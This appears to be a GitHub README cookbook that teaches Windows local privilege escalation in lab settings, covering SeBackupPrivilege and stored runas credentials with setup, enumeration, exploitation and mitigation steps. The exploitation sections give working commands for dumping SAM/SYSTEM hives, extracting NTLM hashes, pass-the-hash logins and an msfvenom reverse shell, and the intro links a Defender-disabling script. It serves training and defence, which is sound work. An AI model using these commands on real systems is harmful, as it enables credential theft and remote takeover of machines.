# Windows Local Privilege Escalation Cookbook (On Progress)
<p align="center">
  <img src="/Pictures/Windows-Funny.jpg">
</p>

## Description (Keynote)

This CookBook was created with the main purpose of helping people understand local privilege escalation techniques on Windows environments. Moreover, it can be used for both attacking and defensive purposes.

:information_source: This CookBook focuses only on misconfiguration vulnerabilities on Windows workstations/servers/machines.

:warning: Evasion techniques to bypass security protections, endpoints, and antivirus are not included in this cookbook. I created this PowerShell script, [TurnOffAV.ps1](/Lab-Setup-Scripts/TurnOffAV.ps1), which permanently disables Windows Defender. Run this with local Administrator privileges.

The main structure of this CookBook includes the following sections:

- Description (of the vulnerability)
- Lab Setup
- Enumeration
- Exploitation
- Mitigation
- (Useful) References

I hope to find this CookBook useful and learn new stuff 😉.

## Table of Contents

- [Windows Local Privilege Escalation CookBook](#windows-local-privilege-escalation-cookbook)
  - [Description (Keynote)](#description-keynote)
  - [Table of Contents](#table-of-contents)
  - [Useful Tools](#useful-tools)
  - [Vulnerabilities](#vulnerabilities)
  - [References](#references)

## Useful Tools

In the following table, some popular and useful tools for Windows local privilege escalation are presented:

| Name | Language | Description |
| ---- |:-----------:|:-----------:|
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# | SharpUp is a C# port of various PowerUp functionality |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell | PowerUp aims to be a clearinghouse of common Windows privilege escalation |
| [BeRoot](https://github.com/AlessandroZ/BeRoot) | Python | BeRoot(s) is a post exploitation tool to check common Windows misconfigurations to find a way to escalate our privilege |
| [Privesc](https://github.com/enjoiz/Privesc) | PowerShell | Windows PowerShell script that finds misconfiguration issues which can lead to privilege escalation |
| [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) | C# | Windows local Privilege Escalation Awesome Script |

## Vulnerabilities

This CookBook presents the following Windows vulnerabilities:

- [AlwaysInstallElevated](/Notes/AlwaysInstallElevated.md)
- [Logon Autostart Execution (Registry Run Keys)](#logon-autostart-execution-registry-run-keys)
- [Logon Autostart Execution (Startup Folder)](#logon-autostart-execution-startup-folder)
- [Leaked Credentials (PowerShell History)](/Notes/LeakedCredentialsPowerShellHistory.md)
- [Scheduled Task/Job](/Notes/ScheduledTaskJob.md)
- [SeBackupPrivilege](#sebackupprivilege)
- [SeImpersonatePrivilege](#seimpersonateprivilege)
- [Stored Credentials (Runas)](#stored-credentials-runas)
- [Unquoted Service Path](#unquoted-service-path)
- [Weak Service Binary Permissions](#weak-service-binary-permissions)
- [Weak Service Permissions](#weak-service-permissions)
- [Weak Registry Permissions](#weak-registry-permissions)

## Logon Autostart Execution (Registry Run Keys)

### Description

Logon Autostart Execution through Registry Run Keys is a Windows feature that enables specific programs or scripts to launch automatically when a user logs into the system. This feature allows these programs or scripts to launch automatically without any manual action from the user when the operating system starts up. 

Attackers may exploit the Logon Autostart Execution feature by inserting malicious software into the Registry Run Keys. This enables the malicious code to automatically launch during system startup, potentially granting it elevated privileges. 

### Lab Setup

## SeBackupPrivilege

### Description

The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user. 

However, if this privilege is not properly managed or if it is granted to unauthorized users or processes, it can lead to a privilege escalation vulnerability. The SeBackupPrivilege vulnerability can be exploited by malicious actors to gain unauthorized access to sensitive files and data on a system.

### Lab Setup

#### Manual Lab Setup

1) Open a PowerShell with local Administrator privileges and run the following command to create a new user:

```
net user ncv Passw0rd! /add
```

2) Run the following command to enable the WinRM service:

```
Enable-PSRemoting -Force
```

:information_source: If you are encountering an error in enabling of WinRM and WinRM is not functioning, please follow these steps:

- Go to Settings > Network & Internet.
- Choose either "Ethernet" or "Wi-Fi," depending on your current network connection.
- Under the network profile, set the location to "Private."
- Lastly, execute the following command with Local Administrator privileges to enable PS remoting: `Set-WSManQuickConfig`.

3) Run the following command to add new user to "Remote Management Users" Group:

```
net localgroup "Remote Management Users" ncv /add
```

4) Run the following commands to install and import the Carbon module:

```
Install-Module -Name carbon -Force
```

 and 

 ```
 Import-Module carbon
 ```

 5) Use the following cmdlets to grant the SeBackupPrivilege to the new user and verify the privilege:

 ```
 Grant-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

 and

 ```
 Test-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

Outcome:

![SebackupPrivilege-Manual-Setup](/Pictures/SeBackUp-Manual-Setup.png)

##### PowerShell Script Lab Setup 

Another way to set up the lab with the 'SeBackupPrivilege' vulnerability is by using the custom PowerShell script named [SeBackupPrivilege.ps1](/Lab-Setup-Scripts/SeBackupPrivilege.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\SeBackupPrivilege.ps1
```

Outcome:

![SebackupPrivilege-Script-Setup](/Pictures/SeBackUp-Script.png)

### Enumeration

#### Manual Enumeration

To perform manual enumeration, you can open a command prompt and use the following command to enumerate the current privileges of the user:

```
whoami /priv
```

Outcome:

![SeBackupPrivilege-Manual-Enumeration](/Pictures/SeBackUp-Manual-Enum.png)

#### Tool Enumeration

To run the [SharpUp](https://github.com/GhostPack/SharpUp) tool and perform an enumeration of the `SeBackupPrivilege` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit TokenPrivileges
```

Outcome:

![SeBackupPrivilege-Tool-Enumeration](/Pictures/SeBackUp-Tool-Enum.png)

### Exploitation

To abuse this vulnerability you should follow these steps:

1) Create a temp directory:

```
mkdir C:\temp
```

2) Copy the sam and system hive of HKLM to C:\temp and then download them.

```
reg save hklm\sam C:\temp\sam.hive
```

and

```
reg save hklm\system C:\temp\system.hive
```

Outcome:

![SeBackupPrivilege-Exploitation-Copy-Hives](/Pictures/SeBackUp-Exploitation-1.png)

3) Use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool (Kali Linux Default) and obtain ntlm hashes:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Outcome:

![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)

4) Use again evil-winrm to pass the hash and connect as Local Administrator:

```
evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
```

Outcome:

![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)

### Mitigation

Follow the steps below to remove the `SeBackupPrivilege` from a user:

1) Press Win + R to open the Run dialog, type `secpol.msc`, and hit Enter. This will open the Local Security Policy editor.

2) In the Local Security Policy editor, navigate to **Local Policies** > **User Rights Assignment**.

3) Look for the **Back up files and directories** policy (which corresponds to SeBackupPrivilege).

4) Double-click the policy, and a properties window will appear.

5) In the properties window, you can remove the user or group from the list to revoke the privilege. Click **Apply** and then **OK** to save the changes.

## SeImpersonatePrivilege

## Stored Credentials (Runas)

### Description

The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.

In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access. 

### Lab Setup

#### Manual Lab Setup

1) Open a command-prompt with local Administrator privileges and create a new user with the following command:

```
net user nickvourd Passw0rd! /add
```

2) Add the new user to Administrator's local group:

```
net localgroup "Administrators" nickvourd /add
```

3) Save credentials to Windows Credentials Manager:

```
runas /savecred /user:WORKGROUP\nickvourd cmd.exe
```

Outcome:

![Stored-Creds-Manual-Lab-Setup](/Pictures/Stored-Creds-Manual-Lab-Set-Up.png)

4) Verify the new stored credentials on Windows Credentials Manager (**Control Panel** > **User Accounts** > **Credential Manager**):

![Stored-Creds-Verify-New-Windows-Creds](/Pictures/Stored-Creds-Control-Panel-4.png)

#### PowerShell Script Lab Setup

Another way to set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\StoredCredentialsRunas.ps1
```

:information_source: Please provide the password generated for the `runas` command.

Outcome:

![Stored-Creds-Tool-Lab-Setup](/Pictures/Stored-Creds-Tool-Lab-Set-Up.png)

### Enumeration

To perform enumeration, you can open a command prompt and use the following command to enumerate the stored credentials in the Windows Credentials Manager:

```
cmdkey /list
```

Outcome:

![Stored-Creds-Enum](/Pictures/Stored-Creds-Enum.png)

### Exploitaion

To abuse this scenario you should follow these steps:

1) Create with msfvenom a malicous executable file (i.e., nikos.exe):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
```

2) Transfer the malicious executable file to victim's machine.

3) open a listener from your attacking machine:

```
nc -lvp 1234
```

4) Grant full access permissions to all users:

```
icacls "C:\Windows\Tasks\nikos.exe" /grant Users:F
```

5) Open a command-prompt with regular user privileges and execute the following command:

```
runas /savecred /user:WORKGROUP\nickvourd "C:\Windows\Tasks\nikos.exe"
```

Outcome:

![Stored-Creds-Exploitation-Victim-Side](/Pictures/Stored-Creds-Explotation-1.png)

6) Verify the new reverse shell from your attacking machine:

![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-2.png)

### Mitigation

To mitigate stored credentials from Windows Credentials manager. Please follow these steps:

1) Open **Control Panel** and navigate **User Accounts** > **Credential Manager**:

![Stored-Creds-Control-Panel](/Pictures/Stored-Creds-Control-Panel.png)

2) Select **Windows Credentials**, choose your preferred stored credentials, and select the **remove** option:

![Stored-Creds-Remove-Creds](/Pictures/Stored-Creds-Control-Panel-2.png)

3) Select the option "Yes" on the pop-up window:

![Stored-Creds-Remove-Creds-Confirmation](/Pictures/Stored-Creds-Control-Panel-3.png)

4) Verify that the stored credentials have been successfully removed from the Windows Credentials Manager:

![Stored-Creds-Remove-Creds-Verification](/Pictures/Stored-Creds-Control-Panel-5.png)


## References

- [Privilege Escalation Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [SharpCollection GitHub by Flangvik](https://github.com/Flangvik/SharpCollection)
- [Metasploit Website](https://www.metasploit.com/)
- [Evil-WinRM GitHub by Hackplayers](https://github.com/Hackplayers/evil-winrm)
- [Windows Privilege Escalation Youtube Playlist by Conda](https://www.youtube.com/watch?v=WWE7VIpgd5I&list=PLDrNMcTNhhYrBNZ_FdtMq-gLFQeUZFzWV&index=13)
- [Interactive Logon Authentication Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-authsod/bfc67803-2c41-4fde-8519-adace79465f6)
- [Task Scheduler for developers Microsoft](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
